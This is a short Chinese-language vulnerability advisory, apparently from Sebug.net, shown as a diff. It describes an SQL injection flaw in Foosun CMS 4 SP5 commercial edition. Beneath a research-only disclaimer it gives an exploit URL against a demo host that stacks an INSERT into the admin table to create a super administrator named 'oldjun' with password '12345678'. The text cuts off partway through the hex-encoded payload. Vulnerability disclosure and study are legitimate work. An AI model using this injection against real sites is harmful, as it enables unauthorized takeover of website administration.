@@ -1,0 +1,6 @@
+foosun cms4sp5 商业版存在严重注射漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.下面的代码可以创建一个用户名为oldjun，密码为12345678的超级管理员2.http://demo.foosun.net/User/i_Blog/PublicLogEdit.asp?id=2;insert%0D%0A%0D%0Ainto%20FS_MF_Admin%20(Admin_Name,Admin_Pass_Word,Admin_Is_Super)values(0x6F006C0064006A0075006E00,0x380033006100610034003000300
